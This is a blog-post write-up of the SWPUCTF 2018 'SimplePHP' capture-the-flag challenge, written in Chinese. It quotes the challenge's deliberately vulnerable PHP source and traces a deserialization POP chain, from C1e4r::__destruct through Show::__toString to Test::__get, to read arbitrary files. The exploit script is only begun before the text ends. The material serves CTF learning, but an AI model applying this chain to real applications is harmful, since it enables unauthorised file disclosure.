<!doctype html>
<html lang="en-us">
  <head>
    <title>SWPUCTF_2018_SimplePHP // main1o</title>
    <link rel="shortcut icon" href="pochita.png" />
    <meta charset="utf-8" />
    <meta name="generator" content="Hugo 0.114.0">
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="author" content="John Doe" />
    <meta name="description" content="" />
    <link rel="stylesheet" href="/css/main.min.5b1fcc8902588589c4767187402a3c29f8b8d7a6fdef6d9f8f77045bb0d14fee.css" />
    

    
    <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="SWPUCTF_2018_SimplePHP"/>
<meta name="twitter:description" content="[SWPUCTF 2018]SimplePHP 任意文件包含？
大概有这几个文件。可以读取file.php，function.php，class.php，base.php文件的源码
file.php
&lt;?php header(&#34;content-type:text/html;charset=utf-8&#34;); include &#39;function.php&#39;; include &#39;class.php&#39;; ini_set(&#39;open_basedir&#39;,&#39;/var/www/html/&#39;); $file = $_GET[&#34;file&#34;] ? $_GET[&#39;file&#39;] : &#34;&#34;; if(empty($file)) { echo &#34;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&#34;; } $show = new Show(); if(file_exists($file)) { $show-&gt;source = $file; $show-&gt;_show(); // 这里传的 $file 到 class.php文件中去形成文件读取了 } else if (!empty($file)){ die(&#39;file doesn\&#39;t exists.&#39;); } ?&gt; function.php
文件 &lt;?php //show_source(__FILE__); include &#34;base.php&#34;; header(&#34;Content-type: text/html;charset=utf-8&#34;); error_reporting(0); function upload_file_do() { global $_FILES; $filename = md5($_FILES[&#34;file&#34;][&#34;name&#34;].$_SERVER[&#34;REMOTE_ADDR&#34;]).&#34;.jpg&#34;; //mkdir(&#34;upload&#34;,0777); if(file_exists(&#34;upload/&#34; ."/>

    <meta property="og:title" content="SWPUCTF_2018_SimplePHP" />
<meta property="og:description" content="[SWPUCTF 2018]SimplePHP 任意文件包含？
大概有这几个文件。可以读取file.php，function.php，class.php，base.php文件的源码
file.php
&lt;?php header(&#34;content-type:text/html;charset=utf-8&#34;); include &#39;function.php&#39;; include &#39;class.php&#39;; ini_set(&#39;open_basedir&#39;,&#39;/var/www/html/&#39;); $file = $_GET[&#34;file&#34;] ? $_GET[&#39;file&#39;] : &#34;&#34;; if(empty($file)) { echo &#34;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&#34;; } $show = new Show(); if(file_exists($file)) { $show-&gt;source = $file; $show-&gt;_show(); // 这里传的 $file 到 class.php文件中去形成文件读取了 } else if (!empty($file)){ die(&#39;file doesn\&#39;t exists.&#39;); } ?&gt; function.php
文件 &lt;?php //show_source(__FILE__); include &#34;base.php&#34;; header(&#34;Content-type: text/html;charset=utf-8&#34;); error_reporting(0); function upload_file_do() { global $_FILES; $filename = md5($_FILES[&#34;file&#34;][&#34;name&#34;].$_SERVER[&#34;REMOTE_ADDR&#34;]).&#34;.jpg&#34;; //mkdir(&#34;upload&#34;,0777); if(file_exists(&#34;upload/&#34; ." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://main1o.github.io/post/swpuctf-2018-simplephp/" /><meta property="article:section" content="post" />
<meta property="article:published_time" content="2022-08-04T00:00:00+00:00" />
<meta property="article:modified_time" content="2022-08-04T00:00:00+00:00" />


  </head>
  <body>
    <header class="app-header">
      <a href="https://main1o.github.io/"><img class="app-header-avatar" src="/avatar.png" alt="John Doe" /></a>
      <span class="app-header-title">main1o</span>
      <nav class="app-header-menu">
          <a class="app-header-menu-item" href="/">Home</a>
            -
          
          <a class="app-header-menu-item" href="/tags/">Tags</a>
            -
          
          <a class="app-header-menu-item" href="/links/">Links</a>
            -
          
          <a class="app-header-menu-item" href="/about/">About</a>
      </nav>
      <p>荆棘之路</p>
    </header>
    <main class="app-container">
      
  <article class="post">
    <header class="post-header">
      <h1 class ="post-title">SWPUCTF_2018_SimplePHP</h1>
      <div class="post-meta">
        <div>
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
  <title>calendar</title>
  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
</svg>
          Aug 4, 2022
        </div>
        <div>
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
  <title>clock</title>
  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
</svg>
          3 min read
        </div>
        <div>
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
  <title>tag</title>
  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
</svg>
              <a class="tag" href="https://main1o.github.io/tags/php/">php</a>
              <a class="tag" href="https://main1o.github.io/tags/ctf/">ctf</a>
        </div>
      </div>
    </header>
    <div class="post-content">
      <h1 id="swpuctf-2018simplephp">[SWPUCTF 2018]SimplePHP</h1>
<p>任意文件包含？</p>
<p>大概有这几个文件。可以读取file.php，function.php，class.php，base.php文件的源码</p>
<p><img src="image-20220804225839150.png" alt="image-20220804225839150"></p>
<p>file.php</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> 
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;content-type:text/html;charset=utf-8&#34;</span>);  
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#39;function.php&#39;</span>; 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#39;class.php&#39;</span>; 
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ini_set</span>(<span style="color:#e6db74">&#39;open_basedir&#39;</span>,<span style="color:#e6db74">&#39;/var/www/html/&#39;</span>); 
</span></span><span style="display:flex;"><span>$file <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#34;file&#34;</span>] <span style="color:#f92672">?</span> $_GET[<span style="color:#e6db74">&#39;file&#39;</span>] <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span>; 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#66d9ef">empty</span>($file)) { 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&#34;</span>; 
</span></span><span style="display:flex;"><span>} 
</span></span><span style="display:flex;"><span>$show <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Show</span>(); 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">file_exists</span>($file)) { 
</span></span><span style="display:flex;"><span>    $show<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">source</span> <span style="color:#f92672">=</span> $file; 
</span></span><span style="display:flex;"><span>    $show<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_show</span>(); 
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 这里传的 $file 到 class.php文件中去形成文件读取了
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>} <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($file)){ 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;file doesn\&#39;t exists.&#39;</span>); 
</span></span><span style="display:flex;"><span>} 
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010"> 
</span></span></span></code></pre></div><p>function.php</p>
<ul>
<li>文件</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> 
</span></span><span style="display:flex;"><span><span style="color:#75715e">//show_source(__FILE__); 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#34;base.php&#34;</span>; 
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Content-type: text/html;charset=utf-8&#34;</span>); 
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>); 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">upload_file_do</span>() { 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> $_FILES; 
</span></span><span style="display:flex;"><span>    $filename <span style="color:#f92672">=</span> <span style="color:#a6e22e">md5</span>($_FILES[<span style="color:#e6db74">&#34;file&#34;</span>][<span style="color:#e6db74">&#34;name&#34;</span>]<span style="color:#f92672">.</span>$_SERVER[<span style="color:#e6db74">&#34;REMOTE_ADDR&#34;</span>])<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;.jpg&#34;</span>; 
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//mkdir(&#34;upload&#34;,0777); 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">file_exists</span>(<span style="color:#e6db74">&#34;upload/&#34;</span> <span style="color:#f92672">.</span> $filename)) { 
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">unlink</span>($filename); 
</span></span><span style="display:flex;"><span>    } 
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">move_uploaded_file</span>($_FILES[<span style="color:#e6db74">&#34;file&#34;</span>][<span style="color:#e6db74">&#34;tmp_name&#34;</span>],<span style="color:#e6db74">&#34;upload/&#34;</span> <span style="color:#f92672">.</span> $filename); 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;&lt;script type=&#34;text/javascript&#34;&gt;alert(&#34;上传成功!&#34;);&lt;/script&gt;&#39;</span>; 
</span></span><span style="display:flex;"><span>} 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">upload_file</span>() { 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> $_FILES; 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">upload_file_check</span>()) { 
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">upload_file_do</span>(); 
</span></span><span style="display:flex;"><span>    } 
</span></span><span style="display:flex;"><span>} 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">upload_file_check</span>() { 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> $_FILES; 
</span></span><span style="display:flex;"><span>    $allowed_types <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;gif&#34;</span>,<span style="color:#e6db74">&#34;jpeg&#34;</span>,<span style="color:#e6db74">&#34;jpg&#34;</span>,<span style="color:#e6db74">&#34;png&#34;</span>); 
</span></span><span style="display:flex;"><span>    $temp <span style="color:#f92672">=</span> <span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#34;.&#34;</span>,$_FILES[<span style="color:#e6db74">&#34;file&#34;</span>][<span style="color:#e6db74">&#34;name&#34;</span>]); 
</span></span><span style="display:flex;"><span>    $extension <span style="color:#f92672">=</span> <span style="color:#a6e22e">end</span>($temp); 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#66d9ef">empty</span>($extension)) { 
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//echo &#34;&lt;h4&gt;请选择上传的文件:&#34; . &#34;&lt;h4/&gt;&#34;; 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    } 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>{ 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">in_array</span>($extension,$allowed_types)) { 
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>; 
</span></span><span style="display:flex;"><span>        } 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> { 
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;&lt;script type=&#34;text/javascript&#34;&gt;alert(&#34;Invalid file!&#34;);&lt;/script&gt;&#39;</span>; 
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>; 
</span></span><span style="display:flex;"><span>        } 
</span></span><span style="display:flex;"><span>    } 
</span></span><span style="display:flex;"><span>} 
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010"> 
</span></span></span></code></pre></div><p>base.php</p>
<ul>
<li>前端展示</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> 
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">session_start</span>(); 
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010"> 
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;!DOCTYPE html&gt; 
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;html&gt; 
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;head&gt; 
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;meta charset=&#34;utf-8&#34;&gt; 
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;title&gt;web3&lt;/title&gt; 
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;link rel=&#34;stylesheet&#34; href=&#34;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css&#34;&gt; 
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;script src=&#34;https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js&#34;&gt;&lt;/script&gt; 
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;script src=&#34;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js&#34;&gt;&lt;/script&gt; 
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;/head&gt; 
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;body&gt; 
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;nav class=&#34;navbar navbar-default&#34; role=&#34;navigation&#34;&gt; 
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;div class=&#34;container-fluid&#34;&gt; 
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;div class=&#34;navbar-header&#34;&gt; 
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            &lt;a class=&#34;navbar-brand&#34; href=&#34;index.php&#34;&gt;首页&lt;/a&gt; 
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;/div&gt; 
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            &lt;ul class=&#34;nav navbar-nav navbra-toggle&#34;&gt; 
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                &lt;li class=&#34;active&#34;&gt;&lt;a href=&#34;file.php?file=&#34;&gt;查看文件&lt;/a&gt;&lt;/li&gt; 
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                &lt;li&gt;&lt;a href=&#34;upload_file.php&#34;&gt;上传文件&lt;/a&gt;&lt;/li&gt; 
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            &lt;/ul&gt; 
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            &lt;ul class=&#34;nav navbar-nav navbar-right&#34;&gt; 
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                &lt;li&gt;&lt;a href=&#34;index.php&#34;&gt;&lt;span class=&#34;glyphicon glyphicon-user&#34;&gt;&lt;/span&gt;&lt;?php echo $_SERVER[&#39;REMOTE_ADDR&#39;];?&gt;&lt;/a&gt;&lt;/li&gt; 
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            &lt;/ul&gt; 
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;/div&gt; 
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;/nav&gt; 
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;/body&gt; 
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;/html&gt; 
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;!--flag is in f1ag.php--&gt;
</span></span></span></code></pre></div><p><strong>class.php</strong></p>
<ul>
<li>魔法方法出现最多的一个php文件</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">C1e4r</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $test;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $str;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($name)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">str</span> <span style="color:#f92672">=</span> $name;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __destruct()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">test</span> <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">str</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">test</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Show</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $source;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $str;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($file)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">source</span> <span style="color:#f92672">=</span> $file;   
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">source</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __toString()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        $content <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">str</span>[<span style="color:#e6db74">&#39;str&#39;</span>]<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">source</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $content;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __set($key,$value)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span>$key <span style="color:#f92672">=</span> $value;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">_show</span>()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/http|https|file:|gopher|dict|\.\.|f1ag/i&#39;</span>,$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">source</span>)) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;hacker!&#39;</span>);
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">highlight_file</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">source</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __wakeup()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/http|https|file:|gopher|dict|\.\./i&#34;</span>, $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">source</span>)) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;hacker~&#34;</span>;
</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">source</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;index.php&#34;</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Test</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $file;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $params;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">params</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __get($key)   <span style="color:#75715e">//  传入点
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">get</span>($key);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">get</span>($key)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">params</span>[$key])) {
</span></span><span style="display:flex;"><span>            $value <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">params</span>[$key];
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            $value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;index.php&#34;</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">file_get</span>($value);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">file_get</span>($value)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        $text <span style="color:#f92672">=</span> <span style="color:#a6e22e">base64_encode</span>(<span style="color:#a6e22e">file_get_contents</span>($value));  <span style="color:#75715e">// 任意文件读取点
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">return</span> $text;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><ol>
<li>
<p>调用<code>Test</code>类中的<code>file_get()</code>方法任意文件读取，<code>get()</code>会调用<code>file_get()</code>方法，传入<code>$value</code>参数，if判断<code>$this-&gt;params[$key]</code>是否有值，没有则传<code>index.php</code>给<code>file_get</code>去读取。但是前面还有一个构造函数<code>__contruct()</code>，定义<code>params</code>为一个数组，<code>__get</code>则去调用<code>get()</code>方法，所以只要触发<code>__get()</code> 方法即可～ ，<code>__get()</code> 魔术方法在<code>读取不存在的属性</code>自动触发！</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">Test</span><span style="color:#f92672">::</span><span style="color:#a6e22e">__construct</span>()
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Test</span><span style="color:#f92672">::</span><span style="color:#a6e22e">__get</span>() <span style="color:#f92672">--&gt;</span> <span style="color:#a6e22e">get</span>() <span style="color:#f92672">--&gt;</span> <span style="color:#a6e22e">file_get</span>()<span style="color:#f92672">.</span><span style="color:#a6e22e">file_get_contents</span>() <span style="color:#75715e">// 读取文件
</span></span></span></code></pre></div></li>
<li>
<p><code>Show</code>类中的<code>__toString()</code>中的<code>$content = $this-&gt;str['str']-&gt;source</code>则是获取一个叫<code>source</code>的属性。假设<code>str['str'] = new Test()</code>读取不存在的属性<code>source</code>刚好就能触发<code>__get()</code>方法！</p>
</li>
<li>
<p><code>__toString()</code>把对象当成字符输出自动触发～，在<code>C1e4r</code>中<code>__destruct()</code>对象被销毁触发，能打印输出值，只要设置<code>$this-&gt;test</code>为<code>new show()</code>对象即可，</p>
</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e"># 构造
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">C1e4r</span><span style="color:#f92672">::</span><span style="color:#a6e22e">__destruct</span> <span style="color:#f92672">--&gt;</span> <span style="color:#a6e22e">Show</span><span style="color:#f92672">::</span><span style="color:#a6e22e">toString</span>() <span style="color:#f92672">--&gt;</span>  <span style="color:#a6e22e">Test</span><span style="color:#f92672">::</span><span style="color:#a6e22e">__get</span>() <span style="color:#f92672">--&gt;</span><span style="color:#a6e22e">get</span>()<span style="color:#f92672">--&gt;</span><span style="color:#a6e22e">file_get_contents</span>()
</span></span></code></pre></div><p>POP：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">C1e4r</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $test;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $str;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Show</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $source;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $str;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Test</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $file;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $params;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$c <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">C1e4r</span>();
